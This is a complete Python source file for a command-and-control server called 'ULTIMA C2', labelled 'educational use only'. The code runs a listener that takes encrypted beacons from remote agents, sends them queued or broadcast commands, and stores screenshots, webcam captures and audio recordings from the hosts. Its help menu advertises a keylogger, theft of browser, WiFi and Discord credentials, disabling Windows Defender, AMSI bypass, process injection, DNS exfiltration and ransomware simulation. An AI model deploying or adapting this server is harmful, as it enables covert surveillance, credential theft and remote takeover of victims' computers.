#!/usr/bin/env python3
"""
ULTIMA C2 SERVER - Command and Control Center
Educational Use Only - Controlled Environments
"""
import socket
import threading
import queue
import time
import json
import os
import sys
import base64
from datetime import datetime
from cryptography.fernet import Fernet

# ==================== CONFIGURATION ====================
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444
ENCRYPTION_KEY = Fernet.generate_key()
# ======================================================

# Terminal Colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Global State
sessions = {}
session_counter = 1
listener_running = False
listener_socket = None
command_history = []
fernet = Fernet(ENCRYPTION_KEY)

def encrypt_data(data):
    """Encrypt data for transmission."""
    return fernet.encrypt(data.encode())

def decrypt_data(encrypted_data):
    """Decrypt received data."""
    try:
        return fernet.decrypt(encrypted_data).decode()
    except:
        return "[DECRYPTION ERROR]"

def print_banner():
    """Display the server banner."""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Colors.BOLD}{Colors.MAGENTA}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗             ║
║    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗            ║
║    ██║   ██║██║     ██║   ██║██╔████╔██║███████║            ║
║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║            ║
║    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║            ║
║     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝            ║
║                                                              ║
║    {Colors.CYAN}Advanced Command & Control Server v2.0{Colors.MAGENTA}         ║
║    {Colors.YELLOW}Educational Demonstration Only{Colors.MAGENTA}                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
    print(banner)
    print(f"{Colors.CYAN}[*] Server Initialized at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
    print(f"{Colors.CYAN}[*] Listening on {LISTEN_IP}:{LISTEN_PORT}{Colors.END}")
    print(f"{Colors.YELLOW}[!] FOR CONTROLLED EDUCATIONAL USE ONLY{Colors.END}\n")

def start_listener():
    """Start the C2 listener."""
    global listener_running, listener_socket
    
    try:
        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener_socket.bind((LISTEN_IP, LISTEN_PORT))
        listener_socket.listen(5)
        listener_socket.settimeout(1)
        listener_running = True
        
        print(f"{Colors.GREEN}[+] Listener started on port {LISTEN_PORT}{Colors.END}")
        
        # Start connection handler thread
        handler_thread = threading.Thread(target=handle_connections, daemon=True)
        handler_thread.start()
        
        return True
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to start listener: {e}{Colors.END}")
        return False

def handle_connections():
    """Handle incoming client connections."""
    global session_counter
    
    while listener_running:
        try:
            client_socket, client_address = listener_socket.accept()
            session_id = session_counter
            session_counter += 1
            
            # Create session
            sessions[session_id] = {
                'socket': client_socket,
                'address': client_address,
                'info': 'Connecting...',
                'queue': queue.Queue(),
                'active': True,
                'last_seen': datetime.now(),
                'username': 'Unknown',
                'hostname': 'Unknown',
                'os': 'Unknown'
            }
            
            # Start session handler
            session_thread = threading.Thread(
                target=handle_session,
                args=(session_id,),
                daemon=True
            )
            session_thread.start()
            
            print(f"{Colors.GREEN}[+] New session {session_id} from {client_address[0]}:{client_address[1]}{Colors.END}")
            
        except socket.timeout:
            continue
        except:
            break

def handle_session(session_id):
    """Handle communication with a session."""
    session = sessions.get(session_id)
    if not session:
        return
    
    sock = session['socket']
    
    try:
        # Receive initial beacon (encrypted)
        encrypted_beacon = sock.recv(4096)
        if encrypted_beacon:
            beacon = decrypt_data(encrypted_beacon)
            try:
                beacon_data = json.loads(beacon)
                session['username'] = beacon_data.get('username', 'Unknown')
                session['hostname'] = beacon_data.get('hostname', 'Unknown')
                session['os'] = beacon_data.get('os', 'Unknown')
                session['info'] = f"{session['hostname']} ({session['username']}) - {session['os']}"
            except:
                session['info'] = beacon
            
            print(f"{Colors.CYAN}[*] Session {session_id}: {session['info']}{Colors.END}")
        
        # Command loop
        while session['active']:
            # Check for queued commands
            if not session['queue'].empty():
                cmd = session['queue'].get()
                
                # Handle special file operations
                if cmd.startswith('[FILE_UPLOAD]'):
                    handle_file_upload(session_id, sock, cmd)
                    continue
                elif cmd.startswith('[FILE_DOWNLOAD]'):
                    handle_file_download(session_id, sock, cmd)
                    continue
                
                # Send regular command
                sock.send(encrypt_data(cmd))
                
                # Receive response
                response = receive_response(sock)
                if response:
                    display_response(session_id, response)
                else:
                    break
            
            time.sleep(0.1)
            
    except Exception as e:
        print(f"{Colors.RED}[!] Session {session_id} error: {e}{Colors.END}")
    
    # Cleanup
    session['active'] = False
    try:
        sock.close()
    except:
        pass
    
    print(f"{Colors.YELLOW}[-] Session {session_id} closed{Colors.END}")

def receive_response(sock, timeout=10):
    """Receive response from agent."""
    sock.settimeout(timeout)
    try:
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
        
        if data:
            return decrypt_data(data)
        return None
    except socket.timeout:
        return "[TIMEOUT] No response received"
    except:
        return None

def handle_file_upload(session_id, sock, cmd):
    """Handle file upload to agent."""
    try:
        # Format: [FILE_UPLOAD]local_path|remote_path|base64_data
        parts = cmd[14:].split('|', 2)
        if len(parts) == 3:
            local_path, remote_path, b64_data = parts
            
            # Send command
            sock.send(encrypt_data(f"!file_upload {remote_path}|{b64_data}"))
            
            # Get response
            response = receive_response(sock)
            print(f"{Colors.GREEN}[+] File upload to session {session_id}: {response}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] File upload failed: {e}{Colors.END}")

def handle_file_download(session_id, sock, cmd):
    """Handle file download from agent."""
    try:
        # Format: [FILE_DOWNLOAD]remote_path|local_path
        parts = cmd[16:].split('|', 1)
        if len(parts) == 2:
            remote_path, local_path = parts
            
            # Send command
            sock.send(encrypt_data(f"!file_download {remote_path}"))
            
            # Get file data
            response = receive_response(sock, timeout=30)
            if response and response.startswith('[FILE]'):
                file_data = base64.b64decode(response[6:])
                with open(local_path, 'wb') as f:
                    f.write(file_data)
                print(f"{Colors.GREEN}[+] File downloaded from session {session_id} to {local_path}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Download failed: {response}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] File download failed: {e}{Colors.END}")

def display_response(session_id, response):
    """Display response with formatting."""
    if response.startswith('[SCREEN]'):
        # Handle screenshot
        b64_data = response[8:]
        filename = f"screenshots/session_{session_id}_{int(time.time())}.jpg"
        os.makedirs("screenshots", exist_ok=True)
        
        try:
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(b64_data))
            print(f"{Colors.GREEN}[+] Screenshot saved: {filename}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] Failed to save screenshot{Colors.END}")
    
    elif response.startswith('[WEBCAM]'):
        # Handle webcam capture
        b64_data = response[7:]
        filename = f"webcam/session_{session_id}_{int(time.time())}.jpg"
        os.makedirs("webcam", exist_ok=True)
        
        try:
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(b64_data))
            print(f"{Colors.GREEN}[+] Webcam image saved: {filename}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] Failed to save webcam image{Colors.END}")
    
    elif response.startswith('[AUDIO]'):
        # Handle audio recording
        b64_data = response[7:]
        filename = f"audio/session_{session_id}_{int(time.time())}.wav"
        os.makedirs("audio", exist_ok=True)
        
        try:
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(b64_data))
            print(f"{Colors.GREEN}[+] Audio recording saved: {filename}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] Failed to save audio{Colors.END}")
    
    elif response.startswith('[FILE]'):
        # File data - handled separately
        pass
    
    else:
        # Regular response
        print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}Response from Session {session_id}:{Colors.END}")
        print(f"{Colors.WHITE}{response}{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")

def show_sessions():
    """Display all active sessions."""
    if not sessions:
        print(f"{Colors.YELLOW}[!] No active sessions{Colors.END}")
        return
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}ACTIVE SESSIONS:{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    
    for sid, session in sessions.items():
        status = f"{Colors.GREEN}ACTIVE{Colors.END}" if session['active'] else f"{Colors.RED}DEAD{Colors.END}"
        print(f"{Colors.BOLD}[{sid}] {session['address'][0]}:{session['address'][1]} - {status}{Colors.END}")
        print(f"     {Colors.WHITE}{session['info']}{Colors.END}")
        print(f"     Last seen: {session['last_seen'].strftime('%H:%M:%S')}")
        print(f"     Queue size: {session['queue'].qsize()}")
        print()
    
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")

def interact_session(session_id):
    """Enter interactive mode with a session."""
    if session_id not in sessions or not sessions[session_id]['active']:
        print(f"{Colors.RED}[!] Invalid or inactive session{Colors.END}")
        return
    
    session = sessions[session_id]
    print(f"{Colors.GREEN}[*] Interacting with session {session_id}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Type 'back' to return to main menu{Colors.END}")
    print(f"{Colors.YELLOW}[*] Type 'help' for command reference{Colors.END}")
    print(f"{Colors.YELLOW}[*] Type 'history' to see command history{Colors.END}\n")
    
    while True:
        try:
            # Show prompt
            prompt = f"{Colors.BOLD}{Colors.MAGENTA}C2[{session_id}]#{Colors.END} "
            cmd = input(prompt).strip()
            
            if cmd.lower() == 'back':
                break
            
            elif cmd.lower() == 'help':
                show_interactive_help()
                continue
            
            elif cmd.lower() == 'history':
                show_command_history()
                continue
            
            elif cmd == '':
                continue
            
            # Add to history
            command_history.append(f"Session {session_id}: {cmd}")
            if len(command_history) > 50:
                command_history.pop(0)
            
            # Queue command
            session['queue'].put(cmd)
            print(f"{Colors.YELLOW}[*] Command queued...{Colors.END}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Returning to main menu{Colors.END}")
            break

def show_interactive_help():
    """Show help for interactive mode."""
    help_text = f"""
{Colors.BOLD}{Colors.CYAN}INTERACTIVE MODE COMMANDS:{Colors.END}

{Colors.GREEN}[EVASION]{Colors.END}
  !amsi_bypass           - Demonstrate AMSI bypass
  !sandbox_check         - Check for sandbox/VMs
  !polymorphic           - Show polymorphic techniques

{Colors.GREEN}[INTELLIGENCE]{Colors.END}
  !keylog_start [60]     - Start keylogger (seconds)
  !screenshot            - Capture screenshot
  !webcam                - Capture webcam image
  !record_audio [10]     - Record audio (seconds)
  !browser_passwords     - Extract browser credentials
  !wifi_passwords        - Get saved WiFi passwords
  !discord_tokens        - Extract Discord tokens
  !clipboard             - Get clipboard contents

{Colors.GREEN}[SYSTEM]{Colors.END}
  !process_list          - List running processes
  !process_kill <PID>    - Kill process
  !file_upload <loc>|b64 - Upload file
  !file_download <path>  - Download file
  !privilege_check       - Check for privilege escalation
  !defender_disable      - Disable Windows Defender
  !process_inject [PID]  - Demonstrate injection

{Colors.GREEN}[NETWORK]{Colors.END}
  !domain_fronting       - Show domain fronting
  !dga_domain [seed]     - Generate DGA domain
  !dns_exfil <data>      - DNS exfiltration demo
  !network_scan          - Scan local network

{Colors.GREEN}[ADVANCED]{Colors.END}
  !contacts              - Harvest contacts
  !phishing_templates    - Show phishing templates
  !ransomware_simulate   - Safe ransomware simulation
  !self_destruct         - Cleanup and exit

{Colors.GREEN}[UTILITIES]{Colors.END}
  whoami                 - Current user
  hostname               - System hostname
  ipconfig               - Network configuration
  dir                    - Directory listing
  cd <path>              - Change directory
  exit                   - Close session

{Colors.YELLOW}Note: All file transfers use base64 encoding{Colors.END}
"""
    print(help_text)

def show_command_history():
    """Show command history."""
    if not command_history:
        print(f"{Colors.YELLOW}[!] No command history{Colors.END}")
        return
    
    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}COMMAND HISTORY:{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    
    for i, cmd in enumerate(command_history[-10:]):  # Show last 10
        print(f"{i+1:3}. {cmd}")
    
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")

def broadcast_command():
    """Send command to all active sessions."""
    cmd = input(f"{Colors.YELLOW}[*] Broadcast command: {Colors.END}").strip()
    if not cmd:
        return
    
    active_sessions = 0
    for sid, session in sessions.items():
        if session['active']:
            session['queue'].put(cmd)
            active_sessions += 1
    
    print(f"{Colors.GREEN}[*] Command broadcasted to {active_sessions} active sessions{Colors.END}")

def show_session_info(session_id):
    """Show detailed session information."""
    if session_id not in sessions:
        print(f"{Colors.RED}[!] Invalid session ID{Colors.END}")
        return
    
    session = sessions[session_id]
    
    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}SESSION {session_id} DETAILS:{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    
    print(f"{Colors.WHITE}Address:     {session['address'][0]}:{session['address'][1]}{Colors.END}")
    print(f"{Colors.WHITE}Hostname:    {session['hostname']}{Colors.END}")
    print(f"{Colors.WHITE}Username:    {session['username']}{Colors.END}")
    print(f"{Colors.WHITE}OS:          {session['os']}{Colors.END}")
    print(f"{Colors.WHITE}Status:      {'ACTIVE' if session['active'] else 'INACTIVE'}{Colors.END}")
    print(f"{Colors.WHITE}Last Seen:   {session['last_seen'].strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
    print(f"{Colors.WHITE}Queue Size:  {session['queue'].qsize()}{Colors.END}")
    print(f"{Colors.WHITE}Info:        {session['info']}{Colors.END}")
    
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")

def kill_session(session_id):
    """Terminate a session."""
    if session_id not in sessions:
        print(f"{Colors.RED}[!] Invalid session ID{Colors.END}")
        return
    
    sessions[session_id]['active'] = False
    print(f"{Colors.RED}[*] Session {session_id} marked for termination{Colors.END}")

def show_main_help():
    """Show main menu help."""
    help_text = f"""
{Colors.BOLD}{Colors.CYAN}ULTIMA C2 SERVER - MAIN MENU{Colors.END}

{Colors.GREEN}1. Start Listener{Colors.END}      - Start C2 listener on port {LISTEN_PORT}
{Colors.GREEN}2. Stop Listener{Colors.END}       - Stop the C2 listener
{Colors.GREEN}3. Show Sessions{Colors.END}       - List all active sessions
{Colors.GREEN}4. Interact{Colors.END}            - Interact with a session
{Colors.GREEN}5. Broadcast{Colors.END}           - Send command to all sessions
{Colors.GREEN}6. Session Info{Colors.END}        - Get detailed session information
{Colors.GREEN}7. Kill Session{Colors.END}        - Terminate a session
{Colors.GREEN}8. View History{Colors.END}        - View command history
{Colors.GREEN}9. Help{Colors.END}                - Show this help menu
{Colors.GREEN}0. Exit{Colors.END}                - Exit the server

{Colors.YELLOW}Press Ctrl+C at any time to cancel operation{Colors.END}
"""
    print(help_text)

def main():
    """Main server loop."""
    print_banner()
    
    # Create directories
    os.makedirs("screenshots", exist_ok=True)
    os.makedirs("webcam", exist_ok=True)
    os.makedirs("audio", exist_ok=True)
    os.makedirs("downloads", exist_ok=True)
    
    while True:
        try:
            # Main menu
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.BOLD}MAIN MENU{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            global listener_running, listener_socket
            choice = input(f"{Colors.BOLD}{Colors.MAGENTA}ULTIMA> {Colors.END}").strip()
            
            if choice == '1':
                if not listener_running:
                    start_listener()
                else:
                    print(f"{Colors.YELLOW}[!] Listener already running{Colors.END}")
            
            elif choice == '2':
                listener_running = False
                if listener_socket:
                    listener_socket.close()
                print(f"{Colors.YELLOW}[*] Listener stopped{Colors.END}")
            
            elif choice == '3':
                show_sessions()
            
            elif choice == '4':
                session_id = input(f"{Colors.YELLOW}[*] Enter session ID: {Colors.END}").strip()
                if session_id.isdigit():
                    interact_session(int(session_id))
            
            elif choice == '5':
                broadcast_command()
            
            elif choice == '6':
                session_id = input(f"{Colors.YELLOW}[*] Enter session ID: {Colors.END}").strip()
                if session_id.isdigit():
                    show_session_info(int(session_id))
            
            elif choice == '7':
                session_id = input(f"{Colors.YELLOW}[*] Enter session ID to kill: {Colors.END}").strip()
                if session_id.isdigit():
                    kill_session(int(session_id))
            
            elif choice == '8':
                show_command_history()
            
            elif choice == '9':
                show_main_help()
            
            elif choice == '0':
                print(f"{Colors.YELLOW}[*] Shutting down server...{Colors.END}")
                
                # Close all sessions
                for sid in list(sessions.keys()):
                    sessions[sid]['active'] = False
                
                # Close listener
                listener_running = False
                if listener_socket:
                    listener_socket.close()
                
                print(f"{Colors.GREEN}[+] Server shutdown complete{Colors.END}")
                sys.exit(0)
            
            else:
                print(f"{Colors.RED}[!] Invalid choice{Colors.END}")
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Press '0' to exit properly{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

if __name__ == "__main__":
    main()